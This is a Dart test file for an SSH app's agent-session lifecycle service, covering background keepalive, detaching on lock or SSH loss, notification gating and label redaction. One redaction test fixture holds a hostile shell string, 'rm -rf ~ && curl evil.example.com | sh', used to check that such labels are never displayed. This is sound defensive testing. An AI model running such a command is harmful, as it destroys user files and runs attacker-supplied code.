// ignore_for_file: public_member_api_docs

import 'dart:async';
import 'dart:convert';

import 'package:drift/native.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:monkeyssh/data/database/database.dart';
import 'package:monkeyssh/domain/models/acp_provider.dart';
import 'package:monkeyssh/domain/models/acp_session_keys.dart';
import 'package:monkeyssh/domain/models/acp_session_state.dart';
import 'package:monkeyssh/domain/models/monkeymux_acp_bridge.dart';
import 'package:monkeyssh/domain/services/acp_bridge_connector.dart';
import 'package:monkeyssh/domain/services/acp_client.dart';
import 'package:monkeyssh/domain/services/acp_json_rpc_connection.dart';
import 'package:monkeyssh/domain/services/acp_lifecycle_service.dart';
import 'package:monkeyssh/domain/services/acp_provider_service.dart';
import 'package:monkeyssh/domain/services/acp_recent_sessions_service.dart';
import 'package:monkeyssh/domain/services/acp_session_manager.dart';
import 'package:monkeyssh/domain/services/acp_transport.dart';
import 'package:monkeyssh/domain/services/diagnostics_log_service.dart';
import 'package:monkeyssh/domain/services/local_notification_service.dart';
import 'package:monkeyssh/domain/services/monkeymux_installer_service.dart';
import 'package:monkeyssh/domain/services/settings_service.dart';

import '../../support/fake_acp_session_manager.dart';

class _RecordingAcpNotificationService extends LocalNotificationService {
  final calls =
      <
        ({
          int id,
          String title,
          String? subtitle,
          String body,
          AcpNotificationPayload payload,
        })
      >[];

  @override
  Future<void> showAcpNotification({
    required int notificationId,
    required String title,
    required String body,
    required AcpNotificationPayload payload,
    String? subtitle,
  }) async {
    calls.add((
      id: notificationId,
      title: title,
      subtitle: subtitle,
      body: body,
      payload: payload,
    ));
  }
}

/// A minimal fake ACP agent transport: enough to open sessions, push
/// permission requests, and complete prompt turns.
class _FakeAcpServer implements AcpTransport {
  _FakeAcpServer() : failInitialize = false;

  /// When true, `initialize` fails so a reconnect can be forced to fail.
  bool failInitialize;

  final _incoming = StreamController<List<int>>();
  int _sessionCounter = 0;
  int _serverRequestId = 0;
  bool closed = false;

  @override
  Stream<List<int>> get incoming => _incoming.stream;

  @override
  Future<void> write(List<int> bytes) async {
    final decoded = jsonDecode(utf8.decode(bytes).trim());
    final message = (decoded! as Map).cast<String, Object?>();
    final method = message['method'];
    final id = message['id'];
    if (id == null) return;

    switch (method) {
      case 'initialize':
        if (failInitialize) {
          _replyError(id, -32602, 'Invalid params');
          break;
        }
        _reply(id, {
          'protocolVersion': 1,
          'agentCapabilities': {
            'loadSession': false,
            'sessionCapabilities': {'resume': <String, Object?>{}},
          },
        });
      case 'session/new':
        _reply(id, {'sessionId': 'session-${++_sessionCounter}'});
      case 'session/resume':
        _reply(id, <String, Object?>{});
      case 'session/prompt':
        _reply(id, {'stopReason': 'end_turn'});
      default:
        _reply(id, <String, Object?>{});
    }
  }

  /// Pushes a `session/request_permission` server request.
  void requestPermission(String sessionId) {
    _push({
      'jsonrpc': '2.0',
      'id': 'srv-${++_serverRequestId}',
      'method': 'session/request_permission',
      'params': {
        'sessionId': sessionId,
        'toolCall': {'toolCallId': 't1', 'title': 'Write file'},
        'options': [
          {'optionId': 'allow', 'name': 'Allow', 'kind': 'allow_once'},
        ],
      },
    });
  }

  void _reply(Object? id, Object? result) =>
      _push({'jsonrpc': '2.0', 'id': id, 'result': result});

  void _replyError(Object? id, int code, String message) => _push({
    'jsonrpc': '2.0',
    'id': id,
    'error': {'code': code, 'message': message},
  });

  void _push(Map<String, Object?> message) {
    if (closed) return;
    _incoming.add(utf8.encode('${jsonEncode(message)}\n'));
  }

  @override
  Future<void> close() async {
    if (closed) return;
    closed = true;
    await _incoming.close();
  }
}

class _FakeConnector implements AcpBridgeConnector {
  _FakeConnector() : serverFactory = null;

  final _FakeAcpServer Function(int hostId, String bridgeId)? serverFactory;
  final Map<String, _FakeAcpServer> servers = <String, _FakeAcpServer>{};
  final List<String> stoppedBridges = <String>[];
  final Set<String> availableBridges = <String>{};
  int _bridgeCounter = 0;

  @override
  Future<MonkeyMuxAcpBridgeStartResult> startBridge({
    required int hostId,
    required String providerId,
    required String providerLabel,
    required List<String> launchArgv,
    required String cwd,
    MonkeyMuxInstallConfirmation? confirmInstall,
  }) async {
    final bridgeId = 'bridge-${++_bridgeCounter}';
    availableBridges.add(bridgeId);
    return MonkeyMuxAcpBridgeStartResult(bridgeId: bridgeId);
  }

  @override
  Future<List<MonkeyMuxAcpBridgeMetadata>> listBridges(
    int hostId, {
    MonkeyMuxInstallConfirmation? confirmInstall,
  }) async => [
    for (final bridgeId in availableBridges)
      MonkeyMuxAcpBridgeMetadata(
        id: bridgeId,
        provider: 'Copilot CLI',
        commandHash: 'hash',
        state: MonkeyMuxAcpProviderState.running,
        clientCount: 0,
        pendingRequestCount: 0,
        inFlightTurnCount: 0,
        lastActivity: DateTime.now(),
        startedAt: DateTime.now(),
        nextSequence: 1,
      ),
  ];

  @override
  Future<String> resolveWorkingDirectory(
    int hostId,
    String cwd, {
    bool trustAbsolute = false,
  }) async => cwd;

  @override
  Future<MonkeyMuxAcpBridgeMetadata> bridgeStatus(
    int hostId,
    String bridgeId,
  ) async => MonkeyMuxAcpBridgeMetadata(
    id: bridgeId,
    provider: 'Copilot CLI',
    commandHash: 'hash',
    state: MonkeyMuxAcpProviderState.running,
    clientCount: 0,
    pendingRequestCount: 0,
    inFlightTurnCount: 0,
    lastActivity: DateTime.now(),
    startedAt: DateTime.now(),
    nextSequence: 1,
  );

  @override
  Future<void> stopBridge(int hostId, String bridgeId) async {
    stoppedBridges.add(bridgeId);
    availableBridges.remove(bridgeId);
  }

  @override
  AcpBridgeSession connect({
    required int hostId,
    required String bridgeId,
    required String providerId,
    int lastAcknowledgedSequence = 0,
  }) {
    final server = serverFactory?.call(hostId, bridgeId) ?? _FakeAcpServer();
    servers[bridgeId] = server;
    final states = StreamController<MonkeyMuxAcpTransportState>.broadcast();
    final errors = StreamController<MonkeyMuxAcpBridgeException>.broadcast();
    final connection = AcpJsonRpcConnection(transport: server);
    final client = AcpClient(connection);
    return AcpBridgeSession(
      client: client,
      transportStates: states.stream,
      transportErrors: errors.stream,
      onClose: () async {
        // Lets a test pause a detach in flight (for example to race a
        // foreground resume against it) by holding the close open until the
        // test explicitly completes the gate.
        final gate = closeGates[bridgeId];
        if (gate != null) await gate.future;
        await client.close();
        await states.close();
        await errors.close();
      },
    );
  }

  /// Completers that gate [AcpBridgeSession.close] for a given bridge id,
  /// used only to deterministically reproduce detach-vs-foreground races.
  final Map<String, Completer<void>> closeGates = <String, Completer<void>>{};

  @override
  Future<AcpHostCapabilityBinding?> resolveCapabilityBinding(
    int hostId,
  ) async => null;
}

Future<void> _pump() => Future<void>.delayed(const Duration(milliseconds: 20));

void main() {
  late AppDatabase database;
  late SettingsService settings;
  late AcpProviderService providerService;
  late AcpRecentSessionsService recentSessions;
  late _FakeConnector connector;
  late AcpSessionManager manager;
  late LocalNotificationService notificationService;
  late Set<int> connectedHostIds;
  late AcpLifecycleService lifecycle;

  Future<AcpSessionKey> startSession({required int hostId}) async {
    final result = await manager.startNewSession(
      hostId: hostId,
      providerId: AcpBuiltinProviderIds.copilotCli,
      cwd: '/repo',
    );
    return (result as AcpSessionLaunchStarted).key;
  }

  setUp(() {
    database = AppDatabase.forTesting(NativeDatabase.memory());
    settings = SettingsService(database);
    providerService = AcpProviderService(settings);
    recentSessions = AcpRecentSessionsService(settings);
    connector = _FakeConnector();
    connectedHostIds = <int>{1, 2};
    manager = AcpSessionManager(
      connector: connector,
      providerService: providerService,
      recentSessions: recentSessions,
      isProUnlocked: () => true,
      diagnostics: const NoopDiagnosticsLogger(),
    );
    notificationService = LocalNotificationService();
    lifecycle = AcpLifecycleService(
      sessionManager: manager,
      hasActiveSshSession: (hostId) => connectedHostIds.contains(hostId),
      notificationService: notificationService,
      diagnostics: const NoopDiagnosticsLogger(),
    )..start();
  });

  tearDown(() async {
    await lifecycle.dispose();
    await manager.dispose();
    notificationService.dispose();
    await database.close();
  });

  group('background keepalive', () {
    test('keeps every healthy session attached across app switching', () async {
      await startSession(hostId: 1);
      await startSession(hostId: 2);

      await lifecycle.handleBackground();
      await Future<void>.delayed(const Duration(milliseconds: 60));
      expect(
        manager.state.sessions.every(
          (session) => session.status == AcpConnectionStatus.ready,
        ),
        isTrue,
      );

      await lifecycle.handleForeground();
      expect(manager.state.sessions.every((session) => session.isLive), isTrue);
    });

    test('continues receiving agent requests while backgrounded', () async {
      final key = await startSession(hostId: 1);
      await lifecycle.handleBackground();
      // Suppress the platform notification side effect in this unit test; the
      // connectivity watcher is intentionally not invoked, so the attachment
      // remains live and exercises background update delivery.
      connectedHostIds.remove(1);

      connector.servers.values.single.requestPermission(key.acpSessionId);
      await _pump();

      expect(
        manager.state.byKeyValue(key.value)!.pendingPermissions,
        hasLength(1),
      );
      expect(
        manager.state.byKeyValue(key.value)!.status,
        AcpConnectionStatus.ready,
      );
    });
  });

  group('auth lock cleanup', () {
    test(
      'detaches every live session without stopping remote bridges',
      () async {
        await startSession(hostId: 1);
        await startSession(hostId: 2);

        await lifecycle.handleAuthLocked();

        expect(
          manager.state.sessions.every(
            (session) => session.status == AcpConnectionStatus.detached,
          ),
          isTrue,
        );
        expect(connector.stoppedBridges, isEmpty);
      },
    );

    test(
      'background stays live until lock and foreground does not reconnect',
      () async {
        final key = await startSession(hostId: 1);

        await lifecycle.handleBackground();
        await Future<void>.delayed(const Duration(milliseconds: 60));
        expect(
          manager.state.byKeyValue(key.value)!.status,
          AcpConnectionStatus.ready,
        );

        await lifecycle.handleAuthLocked();
        expect(
          manager.state.byKeyValue(key.value)!.status,
          AcpConnectionStatus.detached,
        );

        await lifecycle.handleForeground();
        await pumpEventQueue();
        expect(
          manager.state.byKeyValue(key.value)!.status,
          AcpConnectionStatus.detached,
        );
      },
    );
  });

  group('SSH disconnect cleanup', () {
    test('detaches only the session whose host lost its SSH session', () async {
      await startSession(hostId: 1);
      await startSession(hostId: 2);

      connectedHostIds.remove(1);
      await lifecycle.handleSshConnectivityChanged();

      final byHost = {for (final s in manager.state.sessions) s.key.hostId: s};
      expect(byHost[1]!.status, AcpConnectionStatus.detached);
      expect(byHost[2]!.status, AcpConnectionStatus.ready);
      expect(connector.stoppedBridges, isEmpty);
    });
  });

  test('background pending write emits a stable write-approval alert', () async {
    final key = fakeAcpKey();
    final initial = fakeAcpSession(key: key);
    final fakeManager = FakeAcpSessionManager(sessions: [initial]);
    final notifications = _RecordingAcpNotificationService();
    final testLifecycle = AcpLifecycleService(
      sessionManager: fakeManager,
      hasActiveSshSession: (_) => true,
      notificationService: notifications,
      diagnostics: const NoopDiagnosticsLogger(),
    )..start();
    addTearDown(testLifecycle.dispose);
    addTearDown(fakeManager.dispose);
    addTearDown(notifications.dispose);

    await _pump(); // Let the initial zero-pending snapshot reach the observer.
    await testLifecycle.handleBackground();
    fakeManager.emit(
      AcpSessionManagerState(
        sessions: [
          initial.copyWith(
            pendingWrites: [
              AcpPendingWrite(
                requestKey: 's:write-1',
                sessionId: key.acpSessionId,
                path: '/private/path-never-notified',
                contentByteLength: 7,
                requestedAt: DateTime(2026),
              ),
            ],
          ),
        ],
      ),
    );
    await _pump();

    expect(notifications.calls, hasLength(1));
    expect(
      notifications.calls.single.payload.kind,
      AcpNotificationKind.writeApproval,
    );
    expect(
      notifications.calls.single.id,
      acpNotificationIdFor(notifications.calls.single.payload),
    );
    expect(notifications.calls.single.subtitle, isNull);
  });

  test('background alerts name the host and session in the subtitle', () async {
    final key = fakeAcpKey();
    final initial = fakeAcpSession(key: key, title: 'Fix login bug');
    final fakeManager = FakeAcpSessionManager(sessions: [initial]);
    final notifications = _RecordingAcpNotificationService();
    final testLifecycle = AcpLifecycleService(
      sessionManager: fakeManager,
      hasActiveSshSession: (_) => true,
      notificationService: notifications,
      resolveHostLabel: (hostId) async =>
          hostId == key.hostId ? 'devbox' : null,
      diagnostics: const NoopDiagnosticsLogger(),
    )..start();
    addTearDown(testLifecycle.dispose);
    addTearDown(fakeManager.dispose);
    addTearDown(notifications.dispose);

    await _pump();
    await testLifecycle.handleBackground();
    fakeManager.emit(
      AcpSessionManagerState(
        sessions: [
          initial.copyWith(
            pendingWrites: [
              AcpPendingWrite(
                requestKey: 's:write-1',
                sessionId: key.acpSessionId,
                path: '/private/path-never-notified',
                contentByteLength: 7,
                requestedAt: DateTime(2026),
              ),
            ],
          ),
        ],
      ),
    );
    await _pump();

    expect(notifications.calls, hasLength(1));
    final call = notifications.calls.single;
    expect(call.title, 'Copilot CLI needs write approval');
    expect(call.subtitle, 'devbox · Fix login bug');
    expect(call.body, 'Open the app to review and respond.');
    // The working directory and write path never reach the notification.
    expect(call.subtitle, isNot(contains('/')));
  });

  group('notification gating', () {
    test('never notifies while the app is in the foreground', () async {
      final key = await startSession(hostId: 1);
      final taps = <AcpNotificationPayload>[];
      notificationService.acpNotificationTaps.listen(taps.add);

      connector.servers.values.single.requestPermission(
        manager.state.byKeyValue(key.value)!.key.acpSessionId,
      );
      await _pump();

      // Foreground by default; no notification should have been requested.
      // We can't directly observe `showAcpNotification` without a plugin,
      // but we can confirm no tap stream activity occurs from a shown
      // notification (there is nothing to tap because nothing was shown).
      expect(taps, isEmpty);
    });

    test(
      'never notifies while backgrounded with no SSH path to the host',
      () async {
        final key = await startSession(hostId: 1);
        await lifecycle.handleBackground();
        connectedHostIds.remove(1);

        connector.servers.values.single.requestPermission(
          manager.state.byKeyValue(key.value)!.key.acpSessionId,
        );
        await _pump();

        // No exception and no crash is the primary contract here; there is
        // no host SSH path so no notification could ever be delivered.
      },
    );
  });

  group('disposal', () {
    test('dispose keeps healthy background sessions attached', () async {
      await startSession(hostId: 1);
      await lifecycle.handleBackground();
      await lifecycle.dispose();

      // Ordinary backgrounding never schedules a detach, even after disposal.
      await Future<void>.delayed(const Duration(milliseconds: 60));
      expect(manager.state.sessions.single.status, AcpConnectionStatus.ready);
    });

    test('dispose is idempotent', () async {
      await lifecycle.dispose();
      await lifecycle.dispose();
    });
  });

  group('notification label redaction', () {
    AcpSessionState fixture({
      required String providerId,
      required bool isCustomProvider,
    }) {
      final now = DateTime.now();
      return AcpSessionState(
        key: AcpSessionKey.of(
          hostId: 1,
          providerId: providerId,
          bridgeId: 'bridge-1',
          acpSessionId: 'session-1',
        ),
        providerLabel: 'rm -rf ~ && curl evil.example.com | sh',
        isCustomProvider: isCustomProvider,
        cwd: '/repo',
        status: AcpConnectionStatus.ready,
        createdAt: now,
        lastActivityAt: now,
      );
    }

    test('uses the fixed built-in label for a built-in provider', () {
      expect(
        acpSafeAgentDisplayLabel(
          fixture(
            providerId: AcpBuiltinProviderIds.copilotCli,
            isCustomProvider: false,
          ),
        ),
        'Copilot CLI',
      );
      expect(
        acpSafeAgentDisplayLabel(
          fixture(
            providerId: AcpBuiltinProviderIds.openCode,
            isCustomProvider: false,
          ),
        ),
        'OpenCode',
      );
    });

    test('never uses a custom/user-controlled provider label, even one that '
        'looks like a shell command', () {
      final label = acpSafeAgentDisplayLabel(
        fixture(providerId: 'custom-provider-id', isCustomProvider: true),
      );
      expect(label, acpGenericAgentLabel);
      expect(label, isNot(contains('rm -rf')));
      expect(label, isNot(contains('curl')));
    });

    test('falls back to the generic label for an unrecognized non-custom '
        'provider id', () {
      expect(
        acpSafeAgentDisplayLabel(
          fixture(
            providerId: 'builtin:future-provider',
            isCustomProvider: false,
          ),
        ),
        acpGenericAgentLabel,
      );
    });
  });
}
